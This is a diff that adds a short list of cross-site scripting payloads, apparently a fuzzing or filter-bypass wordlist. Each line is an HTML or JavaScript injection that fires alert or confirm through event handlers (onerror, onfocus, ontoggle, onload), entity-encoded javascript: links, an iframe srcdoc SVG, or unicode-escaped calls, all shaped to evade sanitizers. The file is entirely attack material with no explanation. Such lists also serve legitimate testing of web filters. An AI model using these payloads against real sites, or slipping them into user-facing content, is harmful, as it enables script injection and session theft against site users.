@@ -1,0 +1,14 @@
+<d3v/onmouseleave=[origin].some(confirm)>click
+<input type="&#x3e"/onfocus="alert(origin)"/autofocus>
+<img src=\u003e onerror=alert(origin)>
+<detail/open=/Open/href=/data=;ontoggle="(alert)(document.domain)"
+<a href=&#01javascript:alert(origin)>
+</*</script+>ssss<%00x%20stc=<script>alert(origin);//++</*</script+/x>*/
+<a/href=javascript&colon;alert()>click
+<a href=&#74;avascript&colon;alert(origin)>test</a>
+<a href="&#74;avascript&colon;alert(origin)">test</a>
+<iframe srcdoc="&lt;svg/onload=alert(origin)&gt;"></iframe>
+<body onload="console.log('&#39;);&#x61;lert(origin);//')">
+<img/src/onerror='console.log("&quot;);&#x61;lert(origin);//)'>
+<img/src/onerror="\u0061lert(origin);">
+
